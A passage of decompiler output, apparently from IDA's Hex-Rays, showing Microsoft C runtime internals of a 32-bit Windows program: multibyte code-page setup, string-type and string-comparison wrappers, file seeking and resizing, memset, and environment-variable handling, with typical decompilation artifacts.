  result = _crtGetStringTypeA(1u, (const CHAR *)&MultiByteStr, v5, (WORD *)&CharType + 1, _lc_codepage, Locale, 1);
  if ( result )
  {
    v3 = HIWORD(CharType);
    return a3 & v3;
  }
  return result;
}

//----- (00406C06) --------------------------------------------------------
BOOL __cdecl _crtGetStringTypeA(DWORD dwInfoType, LPCSTR lpMultiByteStr, int cchSrc, LPWORD lpCharType, UINT CodePage, LCID Locale, int a7)
{
  int v7; // esi@1
  int v8; // eax@11
  int v9; // edi@11
  int v10; // esi@12
  int v11; // eax@15
  LCID v13; // ebx@20
  UINT v14; // edi@22
  signed int v15; // eax@24
  int v16; // eax@27
  BOOL v17; // edi@29
  bool v18; // eax@13
  WORD CharType; // [sp+1Ch] [bp-1Ch]@2
  BOOL v20; // [sp+14h] [bp-24h]@9
  signed int v21; // [sp+18h] [bp-20h]@9
  int v22; // [sp+10h] [bp-28h]@11
  CPPEH_RECORD ms_exc; // [sp+20h] [bp-18h]@12
  int v24; // [sp+0h] [bp-38h]@12
  int *v25; // [sp+Ch] [bp-2Ch]@12

  v7 = 0;
  if ( !dword_40B978 )
  {
    if ( GetStringTypeW(1u, &SrcStr, 1, &CharType) )
    {
      dword_40B978 = 1;
    }
    else
    {
      if ( GetLastError() == 120 )
        dword_40B978 = 2;
    }
  }
  if ( dword_40B978 != 2 && dword_40B978 )
  {
    if ( dword_40B978 == 1 )
    {
      v20 = 0;
      v21 = 0;
      if ( !CodePage )
        CodePage = _lc_codepage;
      v8 = MultiByteToWideChar(CodePage, 8 * (a7 != 0) + 1, lpMultiByteStr, cchSrc, 0, 0);
      v9 = v8;
      v22 = v8;
      if ( v8 )
      {
        ms_exc.disabled = 0;
        ms_exc.old_esp = (DWORD)&v24;
        v10 = (int)&v24;
        v25 = &v24;
        memset(&v24, 0, 2 * v8);
        ms_exc.disabled = -1;
        if ( &v24 )
        {
LABEL_15:
          v11 = MultiByteToWideChar(CodePage, 1u, lpMultiByteStr, cchSrc, (LPWSTR)v10, v9);
          if ( v11 )
            v20 = GetStringTypeW(dwInfoType, (LPCWSTR)v10, v11, lpCharType);
          if ( v21 )
            free(v10);
          return v20;
        }
        v18 = calloc(2, v9);
        v10 = v18;
        if ( v18 )
        {
          v21 = 1;
          goto LABEL_15;
        }
      }
    }
    return 0;
  }
  v13 = Locale;
  if ( !Locale )
    v13 = Locale;
  v14 = CodePage;
  if ( !CodePage )
    v14 = _lc_codepage;
  v15 = _ansicp(v13);
  if ( v15 == -1 )
    return 0;
  if ( v15 != v14 )
  {
    v16 = _convertcp(v14, v15, lpMultiByteStr, (int)&cchSrc, 0, 0);
    v7 = v16;
    if ( !v16 )
      return 0;
    lpMultiByteStr = (LPCSTR)v16;
  }
  v17 = GetStringTypeA(v13, dwInfoType, lpMultiByteStr, cchSrc, lpCharType);
  if ( v7 )
    free(v7);
  return v17;
}

//----- (00406DC0) --------------------------------------------------------
signed int __usercall CPtoLCID<eax>(int a1<eax>)
{
  int v1; // eax@1
  int v2; // eax@2
  int v3; // eax@3
  signed int result; // eax@5

  v1 = a1 - 932;
  if ( v1 )
  {
    v2 = v1 - 4;
    if ( v2 )
    {
      v3 = v2 - 13;
      if ( v3 )
      {
        if ( v3 == 1 )
          result = 1028;
        else
          result = 0;
      }
      else
      {
        result = 1042;
      }
    }
    else
    {
      result = 2052;
    }
  }
  else
  {
    result = 1041;
  }
  return result;
}

//----- (00406DEF) --------------------------------------------------------
int __cdecl setSBCS()
{
  int result; // eax@1

  memset(&mbctype, 0, 0x100u);
  *((_BYTE *)&mbctype + 256) = 0;
  result = 0;
  _mbcodepage = 0;
  _ismbcodepage = 0;
  _mblcid = 0;
  *(_DWORD *)&_mbulinfo.gap_0[0] = 0;
  _mbulinfo.anonymous_0 = 0;
  _mbulinfo.anonymous_1 = 0;
  return result;
}

//----- (00406E18) --------------------------------------------------------
unsigned int __cdecl setSBUpLow()
{
  unsigned int v0; // eax@2
  int v1; // eax@4
  int v2; // edx@5
  unsigned int v3; // ecx@6
  int v4; // ecx@7
  const CHAR *v5; // edi@7
  unsigned int result; // eax@11
  WORD v7; // cx@12
  char v8; // cl@13
  char v9; // cl@23
  unsigned int v10; // ecx@7
  char v11; // bl@7
  int v12; // edx@10
  struct _cpinfo CPInfo; // [sp+504h] [bp-18h]@1
  const CHAR MultiByteStr[256]; // [sp+404h] [bp-118h]@3
  WORD CharType[256]; // [sp+4h] [bp-518h]@11
  _BYTE DestStr[256]; // [sp+304h] [bp-218h]@11
  _BYTE v17[256]; // [sp+204h] [bp-318h]@11

  if ( GetCPInfo(_mbcodepage, &CPInfo) == 1 )
  {
    v0 = 0;
    do
    {
      MultiByteStr[v0] = v0;
      ++v0;
    }
    while ( v0 < 0x100 );
    LOBYTE(v1) = CPInfo.LeadByte[0];
    MultiByteStr[0] = 32;
    if ( CPInfo.LeadByte[0] )
    {
      v2 = (int)&CPInfo.LeadByte[1];
      do
      {
        v3 = *(_BYTE *)v2;
        v1 = (unsigned __int8)v1;
        if ( (unsigned __int8)v1 <= v3 )
        {
          v10 = v3 - v1 + 1;
          v11 = v10;
          v10 >>= 2;
          memset((void *)&MultiByteStr[v1], 538976288, 4 * v10);
          v5 = &MultiByteStr[4 * v10] + v1;
          v4 = v11 & 3;
          while ( v4 )
          {
            *v5++ = 32;
            --v4;
          }
        }
        v12 = v2 + 1;
        LOBYTE(v1) = *(_BYTE *)v12;
        v2 = v12 + 1;
      }
      while ( (_BYTE)v1 );
    }
    _crtGetStringTypeA(1u, MultiByteStr, 256, CharType, _mbcodepage, _mblcid, 0);
    _crtLCMapStringA(_mblcid, 0x100u, MultiByteStr, 256, (WCHAR *)DestStr, 256, _mbcodepage, 0);
    _crtLCMapStringA(_mblcid, 0x200u, MultiByteStr, 256, (WCHAR *)v17, 256, _mbcodepage, 0);
    result = 0;
    while ( 1 )
    {
      v7 = CharType[result];
      if ( v7 & 1 )
      {
        byte_40B9E1[result] = (unsigned __int8)byte_40B9E1[result] | 0x10;
        v8 = DestStr[result];
      }
      else
      {
        if ( !(v7 & 2) )
        {
          mbcasemap[result] = 0;
          goto LABEL_18;
        }
        byte_40B9E1[result] = (unsigned __int8)byte_40B9E1[result] | 0x20;
        v8 = v17[result];
      }
      mbcasemap[result] = v8;
LABEL_18:
      ++result;
      if ( result >= 0x100 )
        return result;
    }
  }
  result = 0;
  do
  {
    if ( result >= 0x41 && result <= 0x5A )
    {
      byte_40B9E1[result] = (unsigned __int8)byte_40B9E1[result] | 0x10;
      v9 = (_BYTE)result + 32;
LABEL_24:
      mbcasemap[result] = v9;
      goto LABEL_29;
    }
    if ( result >= 0x61 && result <= 0x7A )
    {
      byte_40B9E1[result] = (unsigned __int8)byte_40B9E1[result] | 0x20;
      v9 = (_BYTE)result - 32;
      goto LABEL_24;
    }
    mbcasemap[result] = 0;
LABEL_29:
    ++result;
  }
  while ( result < 0x100 );
  return result;
}

//----- (00406FA4) --------------------------------------------------------
signed int __cdecl setmbcp(UINT CodePage)
{
  UINT v1; // esi@1
  UINT v2; // eax@2
  unsigned int v3; // eax@10
  int v4; // edx@10
  BYTE *v5; // ecx@16
  unsigned int v6; // edx@17
  unsigned int v7; // eax@18
  int *v8; // ebx@19
  unsigned int v9; // eax@20
  int *v10; // esi@20
  unsigned __int8 v11; // dl@21
  unsigned int v12; // edi@22
  char v13; // dl@23
  signed int v14; // eax@32
  signed int v16; // eax@28
  int v17; // ecx@28
  struct _cpinfo CPInfo; // [sp+10h] [bp-18h]@13
  unsigned int v19; // [sp+Ch] [bp-1Ch]@19

  v1 = CodePage;
  fSystemSet = 0;
  if ( CodePage == -2 )
  {
    fSystemSet = 1;
    v2 = GetOEMCP();
  }
  else
  {
    if ( CodePage == -3 )
    {
      fSystemSet = 1;
      v2 = GetACP();
    }
    else
    {
      if ( CodePage != -4 )
        goto LABEL_8;
      v2 = _lc_codepage;
      fSystemSet = 1;
    }
  }
  CodePage = v2;
  v1 = v2;
LABEL_8:
  if ( v1 == _mbcodepage )
    return 0;
  if ( !v1 )
  {
LABEL_38:
    setSBCS();
LABEL_39:
    setSBUpLow();
    return 0;
  }
  v4 = 0;
  v3 = 0;
  do
  {
    if ( *(int *)((char *)&_rgcode_page_info + v3) == v1 )
    {
      memset(&mbctype, 0, 0x100u);
      v19 = 0;
      *((_BYTE *)&mbctype + 256) = 0;
      v8 = &dword_40B658[12 * v4];
      do
      {
        LOBYTE(v9) = *(_BYTE *)v8;
        v10 = v8;
        while ( (_BYTE)v9 )
        {
          v11 = *((_BYTE *)v10 + 1);
          if ( !v11 )
            break;
          v9 = (unsigned __int8)v9;
          v12 = v11;
          if ( (unsigned __int8)v9 <= (unsigned int)v11 )
          {
            v13 = _rgctypeflag[v19];
            do
            {
              byte_40B9E1[v9] = v13 | (unsigned __int8)byte_40B9E1[v9];
              ++v9;
            }
            while ( v9 <= v12 );
          }
          v10 = (int *)((char *)v10 + 2);
          LOBYTE(v9) = *(_BYTE *)v10;
        }
        ++v19;
        v8 += 2;
      }
      while ( v19 < 4 );
      _mbcodepage = CodePage;
      _ismbcodepage = 1;
      v16 = CPtoLCID(CodePage);
      *(_DWORD *)&_mbulinfo.gap_0[0] = *(int *)((char *)&dword_40B64C[0] + v17);
      _mbulinfo.anonymous_0 = *(int *)((char *)&dword_40B64C[1] + v17);
      _mblcid = v16;
      _mbulinfo.anonymous_1 = *(int *)((char *)&dword_40B64C[2] + v17);
      goto LABEL_39;
    }
    v3 += 48;
    ++v4;
  }
  while ( v3 < 0xF0 );
  if ( GetCPInfo(v1, &CPInfo) == 1 )
  {
    memset(&mbctype, 0, 0x100u);
    *((_BYTE *)&mbctype + 256) = 0;
    _mbcodepage = v1;
    _mblcid = 0;
    if ( (_DWORD)CPInfo.MaxCharSize <= 1u )
    {
      _ismbcodepage = 0;
    }
    else
    {
      if ( CPInfo.LeadByte[0] )
      {
        v5 = &CPInfo.LeadByte[1];
        do
        {
          LOBYTE(v6) = *v5;
          if ( !*v5 )
            break;
          v7 = *(v5 - 1);
          v6 = (unsigned __int8)v6;
          while ( v7 <= v6 )
          {
            byte_40B9E1[v7] = (unsigned __int8)byte_40B9E1[v7] | 4;
            ++v7;
          }
          v5 += 2;
        }
        while ( *(v5 - 1) );
      }
      v14 = 1;
      do
      {
        byte_40B9E1[v14] = (unsigned __int8)byte_40B9E1[v14] | 8;
        ++v14;
      }
      while ( (unsigned int)v14 < 0xFF );
      _mblcid = CPtoLCID(v1);
      _ismbcodepage = 1;
    }
    *(_DWORD *)&_mbulinfo.gap_0[0] = 0;
    _mbulinfo.anonymous_0 = 0;
    _mbulinfo.anonymous_1 = 0;
    goto LABEL_39;
  }
  if ( fSystemSet )
    goto LABEL_38;
  return -1;
}

//----- (0040718A) --------------------------------------------------------
int __cdecl _initmbctable()
{
  if ( !_mbctype_initialized )
  {
    setmbcp(0xFFFFFFFDu);
    _mbctype_initialized = 1;
  }
  return 0;
}

//----- (004071B0) --------------------------------------------------------
#error "407391: invalid basic block (funcsize=136)"

//----- (004074F0) --------------------------------------------------------
#error "4076D1: invalid basic block (funcsize=136)"

//----- (0040782D) --------------------------------------------------------
signed int __cdecl ValidateExecute(FARPROC lpfn)
{
  signed int v1; // esi@1

  v1 = 1;
  if ( IsBadCodePtr(lpfn) )
    v1 = 0;
  return v1;
}

//----- (00407845) --------------------------------------------------------
void __cdecl terminate()
{
  CPPEH_RECORD ms_exc; // [sp+Ch] [bp-18h]@2

  if ( _pTerminate )
  {
    _pTerminate();
    ms_exc.disabled = -1;
  }
  abort();
}

//----- (00407872) --------------------------------------------------------
signed __int64 __cdecl lseeki64(int a1, int a2, int a3, DWORD dwMoveMethod)
{
  int v4; // edi@2
  int v5; // esi@2
  signed int v6; // eax@3
  int v7; // eax@5
  DWORD v9; // eax@4
  __int64 lDistanceToMove; // [sp+8h] [bp-8h]@3

  if ( a1 >= nhandle
    || (v4 = 4 * (a1 >> 5) + 4242496, v5 = 8 * (a1 & 0x1F), !(*(_BYTE *)(_pioinfo[a1 >> 5] + v5 + 4) & 1)) )
  {
    doserrno = 0;
    goto LABEL_9;
  }
  lDistanceToMove = *(_QWORD *)&a2;
  v6 = get_osfhandle(a1);
  if ( v6 == -1 )
  {
LABEL_9:
    errno = 9;
    return -1i64;
  }
  v9 = SetFilePointer((HANDLE)v6, lDistanceToMove, (LONG *)&lDistanceToMove + 1, dwMoveMethod);
  *(_DWORD *)&lDistanceToMove = v9;
  if ( v9 != -1 || (v7 = GetLastError(), !v7) )
  {
    *(_BYTE *)(*(_DWORD *)v4 + v5 + 4) &= 0xFDu;
    return lDistanceToMove;
  }
  dosmaperr(v7);
  return -1i64;
}

//----- (00407911) --------------------------------------------------------
int __cdecl chsize(int a1, __int32 a2)
{
  int v2; // ebx@1
  int v3; // esi@1
  __int32 v4; // eax@4
  __int32 v5; // edi@5
  unsigned int v6; // eax@7
  int v7; // eax@9
  signed int v9; // eax@3
  void *v10; // eax@17
  BOOL v11; // eax@17
  __int32 v12; // [sp+8h] [bp-1008h]@3
  char v13; // [sp+Ch] [bp-1004h]@6

  v2 = a1;
  v3 = 0;
  if ( a1 >= nhandle || !(*(_BYTE *)(_pioinfo[a1 >> 5] + 8 * (a1 & 0x1F) + 4) & 1) )
  {
    errno = 9;
    return -1;
  }
  v9 = lseek(a1, 0, 1);
  v12 = v9;
  if ( v9 == -1 || (v4 = lseek(v2, 0, 2), v4 == -1) )
    return -1;
  v5 = a2 - v4;
  if ( a2 - v4 <= 0 )
  {
    if ( a2 < v4 )
    {
      lseek(v2, a2, 0);
      v10 = (void *)get_osfhandle(v2);
      v11 = SetEndOfFile(v10);
      v3 = (v11 != 0) - 1;
      if ( !(v11 != 0) )
      {
        errno = 13;
        doserrno = GetLastError();
      }
    }
  }
  else
  {
    memset(&v13, 0, 0x1000u);
    a1 = setmode(v2, 32768);
    while ( 1 )
    {
      v6 = 4096;
      if ( v5 < 4096 )
        v6 = v5;
      v7 = write(v2, &v13, v6);
      if ( v7 == -1 )
        break;
      v5 -= v7;
      if ( v5 <= 0 )
        goto LABEL_15;
    }
    if ( doserrno == 5 )
      errno = 13;
    v3 = -1;
LABEL_15:
    setmode(v2, a1);
  }
  lseek(v2, v12, 0);
  return v3;
}

//----- (00407A70) --------------------------------------------------------
int __cdecl strrchr(int a1, char a2)
{
  signed int v2; // ecx@1
  int v3; // edi@1
  int v4; // ecx@5
  int v5; // edi@5
  int v6; // edi@9
  int result; // eax@10
  char v8; // zf@3
  char v9; // zf@7

  v3 = a1;
  v2 = -1;
  do
  {
    if ( !v2 )
      break;
    v8 = *(_BYTE *)v3++ == 0;
    --v2;
  }
  while ( !v8 );
  v4 = -(v2 + 1);
  v5 = v3 - 1;
  do
  {
    if ( !v4 )
      break;
    v9 = *(_BYTE *)v5++ == a2;
    --v4;
  }
  while ( !v9 );
  v6 = v5 + 1;
  if ( *(_BYTE *)v6 == a2 )
    result = v6;
  else
    result = 0;
  return result;
}

//----- (00407B70) --------------------------------------------------------
void *__cdecl memset(void *a1, unsigned __int8 a2, unsigned int a3)
{
  int v3; // edx@1
  int v4; // eax@2
  void *v5; // edi@2
  int v6; // ecx@3
  unsigned int v7; // ecx@6
  void *result; // eax@9
  unsigned int v9; // ecx@6

  v3 = a3;
  if ( a3 )
  {
    v4 = a2;
    v5 = a1;
    if ( a3 < 4 )
      goto LABEL_13;
    v6 = -(signed int)a1 & 3;
    if ( v6 )
    {
      v3 = a3 - v6;
      do
      {
        *(_BYTE *)v5 = v4;
        v5 = (char *)v5 + 1;
        --v6;
      }
      while ( v6 );
    }
    v4 *= 16843009;
    v9 = v3;
    v3 &= 3u;
    v7 = v9 >> 2;
    if ( !v7 || (memset(v5, v4, 4 * v7), v5 = (char *)v5 + 4 * v7, v3) )
    {
LABEL_13:
      do
      {
        *(_BYTE *)v5 = v4;
        v5 = (char *)v5 + 1;
        --v3;
      }
      while ( v3 );
    }
    result = a1;
  }
  else
  {
    result = a1;
  }
  return result;
}

//----- (00407BD0) --------------------------------------------------------
int __usercall strncnt<eax>(int a1<eax>, int a2)
{
  int v2; // ecx@1

  v2 = a2;
  if ( a2 )
  {
    while ( 1 )
    {
      --v2;
      if ( !*(_BYTE *)a1 )
        break;
      ++a1;
      if ( !v2 )
        goto LABEL_4;
    }
  }
  else
  {
LABEL_4:
    --v2;
  }
  return a2 - v2 - 1;
}

//----- (00407BEC) --------------------------------------------------------
signed int __cdecl _crtCompareStringA(LCID Locale, DWORD dwCmpFlags, LPCSTR lpMultiByteStr, int cchCount1, LPCSTR lpString2, int cchCount2, UINT CodePage)
{
  int v7; // edi@1
  int v8; // esi@1
  signed int v9; // eax@8
  BYTE *v11; // eax@25
  unsigned __int8 v12; // dl@26
  BYTE *v13; // eax@33
  unsigned __int8 v14; // dl@34
  int v15; // ebx@39
  int v16; // eax@40
  int v17; // eax@44
  int v18; // esi@44
  int v19; // edi@45
  UINT v20; // ebx@57
  signed int v21; // eax@59
  int v22; // esi@59
  int v23; // eax@39
  int v24; // eax@46
  int v25; // eax@62
  int v26; // eax@63
  signed int v27; // [sp+20h] [bp-3Ch]@13
  signed int v28; // [sp+18h] [bp-44h]@13
  int v29; // [sp+1Ch] [bp-40h]@13
  struct _cpinfo CPInfo; // [sp+2Ch] [bp-30h]@22
  int v31; // [sp+14h] [bp-48h]@39
  int v32; // [sp+0h] [bp-5Ch]@40
  CPPEH_RECORD ms_exc; // [sp+44h] [bp-18h]@40
  LPWSTR lpString1; // [sp+28h] [bp-34h]@40
  int v35; // [sp+10h] [bp-4Ch]@44
  int *v36; // [sp+Ch] [bp-50h]@45
  int v37; // [sp+24h] [bp-38h]@55

  v7 = 0;
  v8 = 1;
  if ( !dword_40B98C )
  {
    if ( CompareStringW(0, 0, &SrcStr, 1, &SrcStr, 1) )
    {
      dword_40B98C = 1;
    }
    else
    {
      if ( GetLastError() == 120 )
        dword_40B98C = 2;
    }
  }
  if ( cchCount1 > 0 )
    cchCount1 = strncnt((int)lpMultiByteStr, cchCount1);
  v9 = cchCount2;
  if ( cchCount2 > 0 )
  {
    v9 = strncnt((int)lpString2, cchCount2);
    cchCount2 = v9;
  }
  if ( dword_40B98C == 2 || !dword_40B98C )
  {
    v37 = 0;
    if ( !Locale )
      Locale = Locale;
    v20 = CodePage;
    if ( !CodePage )
      v20 = _lc_codepage;
    v21 = _ansicp(Locale);
    v22 = v21;
    if ( v21 == -1 )
      return 0;
    if ( v21 != v20 )
    {
      v25 = _convertcp(v20, v21, lpMultiByteStr, (int)&cchCount1, 0, 0);
      v7 = v25;
      if ( !v25 )
        return 0;
      v26 = _convertcp(v20, v22, lpString2, (int)&cchCount2, 0, 0);
      v37 = v26;
      if ( !v26 )
      {
        free(v7);
        return 0;
      }
      lpMultiByteStr = (LPCSTR)v7;
      lpString2 = (LPCSTR)v37;
    }
    v8 = CompareStringA(Locale, dwCmpFlags, lpMultiByteStr, cchCount1, lpString2, cchCount2);
    if ( v7 )
    {
      free(v7);
      free(v37);
    }
    return v8;
  }
  if ( dword_40B98C != 1 )
    return 0;
  v27 = 0;
  v28 = 0;
  v29 = 0;
  if ( !CodePage )
    CodePage = _lc_codepage;
  if ( !cchCount1 || !v9 )
  {
    if ( cchCount1 == v9 )
      return 2;
    if ( v9 > 1 )
      return v8;
    if ( cchCount1 > 1 )
      return 3;
    if ( !GetCPInfo(CodePage, &CPInfo) )
      return 0;
    if ( cchCount1 > 0 )
    {
      if ( (_DWORD)CPInfo.MaxCharSize >= 2u )
      {
        v11 = CPInfo.LeadByte;
        if ( CPInfo.LeadByte[0] )
        {
          while ( 1 )
          {
            v12 = *(v11 + 1);
            if ( !v12 )
              break;
            if ( *lpMultiByteStr >= *v11 && *lpMultiByteStr <= v12 )
              return 2;
            v11 += 2;
            if ( !*v11 )
              return 3;
          }
        }
      }
      return 3;
    }
    if ( cchCount2 > 0 )
    {
      if ( (_DWORD)CPInfo.MaxCharSize >= 2u )
      {
        v13 = CPInfo.LeadByte;
        if ( CPInfo.LeadByte[0] )
        {
          while ( 1 )
          {
            v14 = *(v13 + 1);
            if ( !v14 )
              break;
            if ( *lpString2 >= *v13 && *lpString2 <= v14 )
              return 2;
            v13 += 2;
            if ( !*v13 )
              return v8;
          }
        }
      }
      return v8;
    }
  }
  v23 = MultiByteToWideChar(CodePage, 9u, lpMultiByteStr, cchCount1, 0, 0);
  v15 = v23;
  v31 = v23;
  if ( !v23 )
    return 0;
  ms_exc.old_esp = (DWORD)&v32;
  lpString1 = (LPWSTR)&v32;
  ms_exc.disabled = -1;
  v16 = (int)&v32;
  if ( !&v32 )
  {
    v16 = malloc(2 * v15);
    lpString1 = (LPWSTR)v16;
    if ( v16 )
    {
      v27 = 1;
      goto LABEL_43;
    }
    return 0;
  }
LABEL_43:
  if ( !MultiByteToWideChar(CodePage, 1u, lpMultiByteStr, cchCount1, (LPWSTR)v16, v15)
    || (v17 = MultiByteToWideChar(CodePage, 9u, lpString2, cchCount2, 0, 0), v18 = v17, v35 = v17, !v17) )
    goto LABEL_52;
  ms_exc.old_esp = (DWORD)&v32;
  v19 = (int)&v32;
  v36 = &v32;
  ms_exc.disabled = -1;
  if ( &v32 )
    goto LABEL_48;
  v24 = malloc(2 * v17);
  v19 = v24;
  if ( v24 )
  {
    v28 = 1;
LABEL_48:
    if ( MultiByteToWideChar(CodePage, 1u, lpString2, cchCount2, (LPWSTR)v19, v18) )
      v29 = CompareStringW(Locale, dwCmpFlags, lpString1, v15, (LPCWSTR)v19, v18);
    if ( v28 )
      free(v19);
  }
LABEL_52:
  if ( v27 )
    free((int)lpString1);
  return v29;
}

//----- (00407F70) --------------------------------------------------------
int __usercall findenv<eax>(int a1<edi>, const CHAR *a2)
{
  LPVOID v2; // esi@1
  char v3; // al@3

  v2 = environ;
  while ( 1 )
  {
    if ( !*(_DWORD *)v2 )
      return -((signed int)(v2 - environ) >> 2);
    if ( !mbsnbicoll(a2, *(LPCSTR *)v2, a1) )
    {
      v3 = *(_BYTE *)(a1 + *(_DWORD *)v2);
      if ( v3 == 61 )
        break;
      if ( !v3 )
        break;
    }
    v2 = (char *)v2 + 4;
  }
  return (signed int)(v2 - environ) >> 2;
}

//----- (00407FBD) --------------------------------------------------------
const char **__usercall copy_environ<eax>(int a1<ecx>, const char **a2<edi>)
{
  const char **result; // eax@1
  int v3; // ecx@1
  int v4; // esi@5
  const char *v5; // eax@7
  const char **v6; // ebx@7
  int v7; // eax@5
  int v8; // [sp+0h] [bp-4h]@1

  v8 = a1;
  v3 = 0;
  result = a2;
  if ( a2 )
  {
    if ( *a2 )
    {
      do
      {
        ++result;
        ++v3;
      }
      while ( *result );
    }
    v7 = malloc(4 * v3 + 4);
    v4 = v7;
    v8 = v7;
    if ( !v7 )
      amsg_exit(9u);
    v5 = *a2;
    v6 = a2;
    while ( v5 )
    {
      *(_DWORD *)v4 = strdup(v5);
      v4 += 4;
      ++v6;
      v5 = *v6;
    }
    *(_DWORD *)v4 &= (unsigned int)v5;
    result = (const char **)v8;
  }
  return result;
}

//----- (0040801E) --------------------------------------------------------
signed int __cdecl _crtsetenv(unsigned __int16 **a1, int a2)
{
  unsigned __int16 *v3; // esi@3
  int v4; // eax@4
  unsigned __int8 v5; // zf@6
  void *v6; // eax@6
  int v7; // eax@16
  int v8; // eax@18
  int v9; // eax@20
  int v10; // edi@20
  LPVOID v11; // esi@20
  int v12; // esi@22
  int v13; // eax@26
  int v14; // eax@35
  int v15; // esi@35
  char v16; // zf@3
  int v17; // ecx@32
  int v18; // eax@35
  int v19; // eax@36
  int v20; // ecx@36
  signed int v21; // [sp+8h] [bp-10h]@1
  int v22; // [sp+14h] [bp-4h]@3
  int v23; // [sp+Ch] [bp-Ch]@4
  int v24; // [sp+10h] [bp-8h]@6

  v21 = 0;
  if ( !a1 )
    return -1;
  v3 = *a1;
  v16 = *a1 == 0;
  v22 = (int)*a1;
  if ( v16 || (v4 = mbschr(v3, 61), v23 = v4, !v4) || v3 == (unsigned __int16 *)v4 )
    return -1;
  v5 = *(_BYTE *)(v4 + 1) == 0;
  v6 = environ;
  v24 = v5;
  if ( environ == (LPVOID)_initenv )
  {
    v6 = copy_environ(v5, (const char **)environ);
    environ = v6;
  }
  if ( !v6 )
  {
    if ( a2 && wenviron )
    {
      if ( _wtomb_environ() )
        return -1;
    }
    else
    {
      if ( v24 )
        return 0;
      v7 = malloc(4u);
      environ = (LPVOID)v7;
      if ( !v7 )
        return -1;
      *(_DWORD *)v7 = 0;
      if ( !wenviron )
      {
        v8 = malloc(4u);
        wenviron = v8;
        if ( !v8 )
          return -1;
        *(_DWORD *)v8 = 0;
      }
    }
  }
  v11 = environ;
  v9 = findenv(v23 - v22, (const CHAR *)v22);
  v10 = v9;
  if ( v9 < 0 || !*(_DWORD *)v11 )
  {
    if ( !v24 )
    {
      if ( v9 < 0 )
        v10 = -v9;
      v13 = realloc(environ, 4 * v10 + 8);
      if ( !v13 )
        return -1;
      v17 = v13 + 4 * v10;
      *(_DWORD *)v17 = v22;
      *(_DWORD *)(v17 + 4) = 0;
      *a1 = 0;
LABEL_33:
      environ = (LPVOID)v13;
      goto LABEL_34;
    }
    free(v22);
    *a1 = 0;
    return 0;
  }
  v12 = (int)((char *)v11 + 4 * v9);
  free(*(_DWORD *)v12);
  if ( v24 )
  {
    while ( *(_DWORD *)v12 )
    {
      *(_DWORD *)v12 = *(_DWORD *)(v12 + 4);
      ++v10;
      v12 += 4;
    }
    v13 = realloc(environ, 4 * v10);
    if ( !v13 )
      goto LABEL_34;
    goto LABEL_33;
  }
  *(_DWORD *)v12 = v22;
  *a1 = 0;
LABEL_34:
  if ( a2 )
  {
    v18 = strlen(v22);
    v14 = malloc(v18 + 2);
    v15 = v14;
    if ( v14 )
    {
      strcpy(v14);
      v19 = v23 + v15 - v22;
      v20 = v24;
      *(_BYTE *)v19 = 0;
      if ( !SetEnvironmentVariableA((LPCSTR)v15, (LPCSTR)((v19 + 1) & -(v20 == 0))) )
        v21 = -1;
      free(v15);
    }
  }
  if ( v24 )
    free(v22);
  return v21;
}

//----- (004081F3) --------------------------------------------------------
int __cdecl fptrap()
{
  return amsg_exit(2u);
}

//----- (004081FC) --------------------------------------------------------
int __cdecl _ansicp(LCID Locale)
{
  int v1; // ecx@1
  int result; // eax@2
  char v3; // [sp+6h] [bp-6h]@1
  CHAR LCData; // [sp+0h] [bp-Ch]@1

  v3 = 0;
  if ( GetLocaleInfoA(Locale, 0x1004u, &LCData, 6) )
    result = atol(v1, (int *)&LCData);
  else
    result = -1;
  return result;
}

//----- (0040823F) --------------------------------------------------------
int __cdecl _convertcp(UINT CodePage, int a2, LPCSTR lpMultiByteStr, int a4, int a5, int a6)
{
  signed int v6; // ebx@1
  int v7; // esi@9
  int v8; // ebx@15
  bool v10; // eax@25
  int v11; // eax@26
  int v12; // eax@14
  bool v13; // eax@16
  int v14; // eax@24
  int v15; // [sp+20h] [bp-34h]@1
  signed int v16; // [sp+10h] [bp-44h]@1
  int cchMultiByte; // [sp+14h] [bp-40h]@1
  signed int v18; // [sp+18h] [bp-3Ch]@1
  struct _cpinfo CPInfo; // [sp+24h] [bp-30h]@2
  int v20; // [sp+1Ch] [bp-38h]@11
  CPPEH_RECORD ms_exc; // [sp+3Ch] [bp-18h]@15
  int v22; // [sp+0h] [bp-54h]@15
  int v23; // [sp+Ch] [bp-48h]@15

  v15 = 0;
  v16 = 0;
  v6 = *(_DWORD *)a4;
  cchMultiByte = *(_DWORD *)a4;
  v18 = 0;
  if ( CodePage == a2 )
  {
    v8 = v23;
  }
  else
  {
    if ( GetCPInfo(CodePage, &CPInfo) )
    {
      if ( CPInfo.MaxCharSize == 1 )
      {
        if ( GetCPInfo(a2, &CPInfo) )
        {
          if ( CPInfo.MaxCharSize == 1 )
            v18 = 1;
        }
      }
    }
    if ( v18 )
    {
      if ( v6 == -1 )
        v7 = strlen((int)lpMultiByteStr) + 1;
      else
        v7 = v6;
      v20 = v7;
    }
    else
    {
      v7 = v20;
    }
    if ( !v18 )
    {
      v12 = MultiByteToWideChar(CodePage, 1u, lpMultiByteStr, v6, 0, 0);
      v7 = v12;
      v20 = v12;
      if ( !v12 )
        return 0;
    }
    ms_exc.disabled = 0;
    ms_exc.old_esp = (DWORD)&v22;
    v8 = (int)&v22;
    v23 = (int)&v22;
    memset(&v22, 0, 2 * v7);
    ms_exc.disabled = -1;
    if ( !&v22 )
    {
      v13 = calloc(2, v7);
      v8 = v13;
      if ( !v13 )
        return 0;
      v16 = 1;
    }
    if ( MultiByteToWideChar(CodePage, 1u, lpMultiByteStr, cchMultiByte, (LPWSTR)v8, v7) )
    {
      if ( a5 )
      {
        if ( WideCharToMultiByte(a2, 0, (LPCWSTR)v8, v7, (LPSTR)a5, a6, 0, 0) )
          v15 = a5;
      }
      else
      {
        if ( v18 || (v14 = WideCharToMultiByte(a2, 0, (LPCWSTR)v8, v7, 0, 0, 0, 0), v7 = v14, v14) )
        {
          v10 = calloc(1, v7);
          v15 = v10;
          if ( v10 )
          {
            v11 = WideCharToMultiByte(a2, 0, (LPCWSTR)v8, v7, (LPSTR)v10, v7, 0, 0);
            if ( v11 )
            {
              if ( cchMultiByte != -1 )
                *(_DWORD *)a4 = v11;
            }
            else
            {
              free(v15);
              v15 = 0;
            }
          }
        }
      }
    }
  }
  if ( v16 )
    free(v8);
  return v15;
}

//----- (00408408) --------------------------------------------------------
signed int __cdecl resetstkoflw()
{
  int v0; // eax@2
  PVOID v1; // ebx@2
  unsigned __int32 v2; // edi@2
  const void *v3; // esi@2
  int v5; // [sp-4h] [bp-5Ch]@1
  struct _MEMORY_BASIC_INFORMATION Buffer; // [sp+30h] [bp-28h]@1
